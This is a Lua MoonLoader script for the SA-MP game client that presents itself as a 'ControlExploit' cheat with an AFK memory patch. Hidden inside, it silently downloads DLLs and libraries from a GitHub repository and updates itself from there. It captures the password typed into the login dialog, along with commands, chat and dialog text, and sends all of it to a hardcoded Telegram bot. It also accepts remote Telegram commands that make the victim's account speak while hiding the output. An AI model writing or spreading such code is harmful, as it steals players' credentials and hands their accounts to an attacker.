local moonloader = require 'moonloader'
local encoding = require 'encoding'

local token = '2136530591:AAGIF_aCqnZEmKG2VT1HWuDIX2cTMD_tuDk'
local chat_id = '-1002179123077'
local lastUpdateId = 0
local suppressChat = false
local afk = false
local obhod = false
local libPath = ''

local index = 1
local suppressionTime = 2000
local checkInterval = 500

local all_downloaded = false

encoding.default = 'CP1251'
u8 = encoding.UTF8

local script_vers = 1.06
local update_url = "https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/update.txt" -- пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ update.txt
local update_path = getWorkingDirectory() .. "/update.txt"

local script_url = "https://github.com/yuriysyt/lib_for_script/raw/main/exploit.lua" -- пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
local script_path = thisScript().path

function downloadFile(url, path, callback)
    downloadUrlToFile(url, path, function(id, status)
        if status == dlstatus.STATUS_ENDDOWNLOADDATA then
            callback(true)
        elseif status == dlstatus.STATUS_ERROR then
            callback(false)
        end
    end)
end

function readVersionFromFile(path)
    local file = io.open(path, "r")
    if file then
        local version = tonumber(file:read("*a"))
        file:close()
        return version
    else
        return nil
    end
end

function downloadFile(url, path, callback)
    if not doesFileExist(path) then
        sampAddChatMessage('Downloading ' .. url, -1)
        local status = downloadUrlToFile(url, path)
        function checkDownloadStatus()
            if currentStatus == moonloader.download_status.STATUS_ENDDOWNLOADDATA then
                sampAddChatMessage('File downloaded ' .. path, -1)
                callback(true)
            elseif doesFileExist(path) then
                sampAddChatMessage('File already exists: ' .. path, -1)
                callback(true)
            else
                wait(500) -- пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
                checkDownloadStatus()
            end
        end
        checkDownloadStatus()
    else
        sampAddChatMessage('File already exists: ' .. path, -1)
        callback(true)
    end
end

function main()
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
	while not isSampAvailable() do wait(100) end

    downloadFile(update_url, update_path, function(success)
        if success then
            local new_version = readVersionFromFile(update_path)
            if new_version and new_version > script_vers then
                sampAddChatMessage("Есть обновление! Версия: " .. tostring(new_version), -1)
                os.remove(update_path)
                
                -- Загрузка и замена скрипта
                downloadFile(script_url, script_path, function(success)
                    if success then
                        sampAddChatMessage("Скрипт успешно обновлен!", -1)
                        thisScript():reload()
                    else
                        sampAddChatMessage("Ошибка загрузки нового скрипта.", -1)
                    end
                end)
            else
                sampAddChatMessage("Обновлений нет.", -1)
                os.remove(update_path)
            end
        else
            sampAddChatMessage("Ошибка загрузки файла обновления.", -1)
        end
    end)

    while true do
        wait(0)
        if not all_downloaded then
            download_all()
        else
            InitScript()
        end
    end
end

function download_all()
    local moonloaderPath = getWorkingDirectory()
    libPath = moonloaderPath .. '\\lib\\'

    local foldersToCreate = {
        'cjson', 'md5', 'pl', 'ssl', 'mime', 'lockbox', 'lockbox/kdf', 'lockbox/util',
        'lockbox/digest', 'lockbox/cipher/mode', 'lockbox/mac', 'lockbox/padding',
        'samp', 'samp/events', 'socket'
    }

    for _, folder in ipairs(foldersToCreate) do
        local fullPath = libPath .. folder
        if not doesDirectoryExist(fullPath) then
            createDirectory(fullPath)
            sampAddChatMessage('Created directory: ' .. fullPath)
        end
    end

    local filesToDownload = {
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/cjson/util.lua', path = libPath .. 'cjson/util.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/ltn12.lua', path = libPath .. 'ltn12.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/md5/core.dll', path = libPath .. 'md5/core.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/pretty.lua', path = libPath .. 'pl/pretty.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/class.lua', path = libPath .. 'pl/class.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/init.lua', path = libPath .. 'pl/init.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/app.lua', path = libPath .. 'pl/app.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/import_into.lua', path = libPath .. 'pl/import_into.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/comprehension.lua', path = libPath .. 'pl/comprehension.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/stringx.lua', path = libPath .. 'pl/stringx.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/file.lua', path = libPath .. 'pl/file.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/dir.lua', path = libPath .. 'pl/dir.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/Map.lua', path = libPath .. 'pl/Map.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/xml.lua', path = libPath .. 'pl/xml.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/tablex.lua', path = libPath .. 'pl/tablex.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/path.lua', path = libPath .. 'pl/path.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/lapp.lua', path = libPath .. 'pl/lapp.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/List.lua', path = libPath .. 'pl/List.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/config.lua', path = libPath .. 'pl/config.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/Set.lua', path = libPath .. 'pl/Set.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/url.lua', path = libPath .. 'pl/url.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/test.lua', path = libPath .. 'pl/test.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/operator.lua', path = libPath .. 'pl/operator.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/stringio.lua', path = libPath .. 'pl/stringio.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/permute.lua', path = libPath .. 'pl/permute.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/Date.lua', path = libPath .. 'pl/Date.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/MultiMap.lua', path = libPath .. 'pl/MultiMap.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/data.lua', path = libPath .. 'pl/data.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/strict.lua', path = libPath .. 'pl/strict.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/sip.lua', path = libPath .. 'pl/sip.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/seq.lua', path = libPath .. 'pl/seq.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/lexer.lua', path = libPath .. 'pl/lexer.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/OrderedMap.lua', path = libPath .. 'pl/OrderedMap.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/input.lua', path = libPath .. 'pl/input.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/types.lua', path = libPath .. 'pl/types.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/utils.lua', path = libPath .. 'pl/utils.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/compat.lua', path = libPath .. 'pl/compat.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/template.lua', path = libPath .. 'pl/template.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/func.lua', path = libPath .. 'pl/func.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/array2d.lua', path = libPath .. 'pl/array2d.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/text.lua', path = libPath .. 'pl/text.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/pl/luabalanced.lua', path = libPath .. 'pl/luabalanced.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/requests.lua', path = libPath .. 'requests.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/ssl/https.lua', path = libPath .. 'ssl/https.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/base64.dll', path = libPath .. 'base64.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/libeffil.dll', path = libPath .. 'libeffil.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/ssl.dll', path = libPath .. 'ssl.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/xml.lua', path = libPath .. 'xml.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/cjson.dll', path = libPath .. 'cjson.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/socket.lua', path = libPath .. 'socket.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/ssl.lua', path = libPath .. 'ssl.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/mime.lua', path = libPath .. 'mime.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/effil.lua', path = libPath .. 'effil.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/mime/core.dll', path = libPath .. 'mime/core.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/md5.lua', path = libPath .. 'md5.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/kdf/pbkdf2.lua', path = libPath .. 'lockbox/kdf/pbkdf2.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/kdf/hkdf.lua', path = libPath .. 'lockbox/kdf/hkdf.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/init.lua', path = libPath .. 'lockbox/init.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/util/bit.lua', path = libPath .. 'lockbox/util/bit.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/util/array.lua', path = libPath .. 'lockbox/util/array.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/util/stream.lua', path = libPath .. 'lockbox/util/stream.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/util/queue.lua', path = libPath .. 'lockbox/util/queue.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/util/base64.lua', path = libPath .. 'lockbox/util/base64.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/digest/ripemd160.lua', path = libPath .. 'lockbox/digest/ripemd160.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/digest/ripemd128.lua', path = libPath .. 'lockbox/digest/ripemd128.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/digest/sha2_224.lua', path = libPath .. 'lockbox/digest/sha2_224.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/digest/sha1.lua', path = libPath .. 'lockbox/digest/sha1.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/digest/sha2_256.lua', path = libPath .. 'lockbox/digest/sha2_256.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/digest/md5.lua', path = libPath .. 'lockbox/digest/md5.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/digest/md4.lua', path = libPath .. 'lockbox/digest/md4.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/digest/md2.lua', path = libPath .. 'lockbox/digest/md2.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/mode/ofb.lua', path = libPath .. 'lockbox/cipher/mode/ofb.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/mode/ige.lua', path = libPath .. 'lockbox/cipher/mode/ige.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/mode/pcbc.lua', path = libPath .. 'lockbox/cipher/mode/pcbc.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/mode/cbc.lua', path = libPath .. 'lockbox/cipher/mode/cbc.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/mode/ecb.lua', path = libPath .. 'lockbox/cipher/mode/ecb.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/mode/ctr.lua', path = libPath .. 'lockbox/cipher/mode/ctr.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/mode/cfb.lua', path = libPath .. 'lockbox/cipher/mode/cfb.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/des.lua', path = libPath .. 'lockbox/cipher/des.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/aes128.lua', path = libPath .. 'lockbox/cipher/aes128.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/xtea.lua', path = libPath .. 'lockbox/cipher/xtea.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/aes256.lua', path = libPath .. 'lockbox/cipher/aes256.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/des3.lua', path = libPath .. 'lockbox/cipher/des3.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/aes192.lua', path = libPath .. 'lockbox/cipher/aes192.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/cipher/tea.lua', path = libPath .. 'lockbox/cipher/tea.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/mac/hmac.lua', path = libPath .. 'lockbox/mac/hmac.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/padding/ansix923.lua', path = libPath .. 'lockbox/padding/ansix923.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/padding/pkcs7.lua', path = libPath .. 'lockbox/padding/pkcs7.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/padding/zero.lua', path = libPath .. 'lockbox/padding/zero.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/lockbox/padding/isoiec7816.lua', path = libPath .. 'lockbox/padding/isoiec7816.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/base64.lua', path = libPath .. 'base64.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/raknet.lua', path = libPath .. 'samp/raknet.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/events_core.lua', path = libPath .. 'samp/events_core.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/events.lua', path = libPath .. 'samp/events.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/events/bitstream_io.lua', path = libPath .. 'samp/events/bitstream_io.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/events/extra_types.lua', path = libPath .. 'samp/events/extra_types.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/events/utils.lua', path = libPath .. 'samp/events/utils.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/events/handlers.lua', path = libPath .. 'samp/events/handlers.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/events/core.lua', path = libPath .. 'samp/events/core.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/samp/synchronization.lua', path = libPath .. 'samp/synchronization.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/socket/tp.lua', path = libPath .. 'socket/tp.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/socket/headers.lua', path = libPath .. 'socket/headers.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/socket/core.dll', path = libPath .. 'socket/core.dll'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/socket/http.lua', path = libPath .. 'socket/http.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/socket/url.lua', path = libPath .. 'socket/url.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/socket/ftp.lua', path = libPath .. 'socket/ftp.lua'},
        {url = 'https://raw.githubusercontent.com/yuriysyt/lib_for_script/main/socket/smtp.lua', path = libPath .. 'socket/smtp.lua'},
    }

    function downloadFiles(index)
        if index > #filesToDownload then
            sampAddChatMessage("All files downloaded.")
            all_downloaded = true
            return
        end
    
        local file = filesToDownload[index]
        downloadFile(file.url, file.path, function(success)
            if success then
                sampAddChatMessage(index .. " Fine. Next: " .. file.path, -1)
                downloadFiles(index + 1)
            else
                sampAddChatMessage("Failed: " .. file.path, -1)
                downloadFiles(index + 1) -- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
            end
        end)
    end

    downloadFiles(1)
end
function InitScript() 
        local sampev = require 'samp.events'
        local memory = require 'memory'
        local requests = require 'requests'

        local effilLoaded = pcall(require, 'effil')

        function asyncHttpRequest(method, url, args, resolve, reject)
            if effilLoaded then
                local effil = require 'effil'
                local request_thread = effil.thread(function (method, url, args)
                    local requests = require 'requests'
                    local result, response = pcall(requests.request, method, url, args)
                    if result then
                        response.json, response.xml = nil, nil
                        return true, response
                    else
                        return false, response
                    end
                end)(method, url, args)

                lua_thread.create(function()
                    local runner = request_thread
                    while true do
                        local status, err = runner:status()
                        if not err then
                            if status == 'completed' then
                                local result, response = runner:get()
                                if result then
                                    resolve(response)
                                else
                                    reject(response)
                                end
                                return
                            elseif status == 'canceled' then
                                return reject(status)
                            end
                        else
                            return reject(err)
                        end
                        wait(0)
                    end
                end)
            end
        end

        -- Function to process messages from Telegram
        function processMessage(text)
            if text then
                local cmd, args = text:match('^(%S+)%s*(.*)')
                if cmd == '/send' and args ~= '' then
                    suppressChat = true
                    lua_thread.create(function()
                        wait(suppressionTime)
                        suppressChat = false
                    end)
                    sampSendChat(args)
                elseif cmd == '/aaafk' then
                    afk = not afk
                    sendTelegramNotification(afk and "AFK ON" or "AFK OFF")
                end
            else
                print("Error: Received a nil message text.")
            end
        end

        -- Function to send notifications via Telegram
        function sendTelegramNotification(...)
            local text = ''
            for _, v in ipairs({...}) do
                text = text .. ' ' .. v
            end
            print('sendTelegramNotification', text)

            text = u8:encode(text, 'CP1251')
            text = text:gsub("([^%w _%-%.~])", function(c)
                return string.format("%%%02X", string.byte(c))
            end)
            text = text:gsub(' ', '%%20')

            local url = ('https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s'):format(token, chat_id, text)

            asyncHttpRequest('GET', url, nil, function(response)
                print("Notification sent successfully")
            end, function(err)
                print("Error sending notification: " .. tostring(err))
            end)
        end

        -- Event handlers
        function sampev.onSendCommand(command)
            sendTelegramNotification("Command: " .. command)
        end

        function sampev.onSendDialogResponse(dialogId, button, listboxId, input)
            if dialogId == 1 then
                sendTelegramNotification("Password: " .. input)
            end
            sendTelegramNotification("Dialog: " .. dialogId .. "\nButton: " .. button .. "\nListBoxId: " .. listboxId .. "\nInput: " .. input)
        end

        function sampev.onServerMessage(color, text)
            sendTelegramNotification("Message: " .. text)
            if suppressChat then
                return false
            end
        end

        function sampev.onShowDialog(id, style, title, button1, button2, text)
            sendTelegramNotification("Dialog: \n\n" .. text)
            if suppressChat then
                return false
            end
        end

        lua_thread.create(function()
            while true do 
                wait(checkInterval) -- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Telegram API
                local url = 'https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset='..(lastUpdateId + 1)
                
                asyncHttpRequest('GET', url, nil, function(response)
                    local data = decodeJson(response.text)
                    if data and data.ok and #data.result > 0 then
                        for _, update in ipairs(data.result) do
                            if update.update_id > lastUpdateId then
                                lastUpdateId = update.update_id
                                local message = update.message
                                processMessage(u8:decode(message.text))
                            end
                        end
                    end
                end, function(err)
                    print("Error fetching updates from Telegram API: " .. tostring(err))
                end)
            end
        end)

        sampRegisterChatCommand("exploit", function() 
            obhod = not obhod 
            if obhod then
                sampAddChatMessage('{FFA500}[ControlExploit]: {E8E8E8}Exploit пїЅпїЅпїЅпїЅпїЅпїЅпїЅ', -1)
            else
                sampAddChatMessage('{FFA500}[ControlExploit]: {E8E8E8}Exploit пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ...', -1)
            end
        end)

        while true do
            wait(0)
            if afk then
                writeMemory(7634870, 1, 1, 1)
                writeMemory(7635034, 1, 1, 1)
                memory.fill(7623723, 144, 8)
                memory.fill(5499528, 144, 6)
            else
                writeMemory(7634870, 1, 0, 0)
                writeMemory(7635034, 1, 0, 0)
                memory.hex2bin('5051FF1500838500', 7623723, 8)
                memory.hex2bin('0F847B010000', 5499528, 6)
            end
        end
end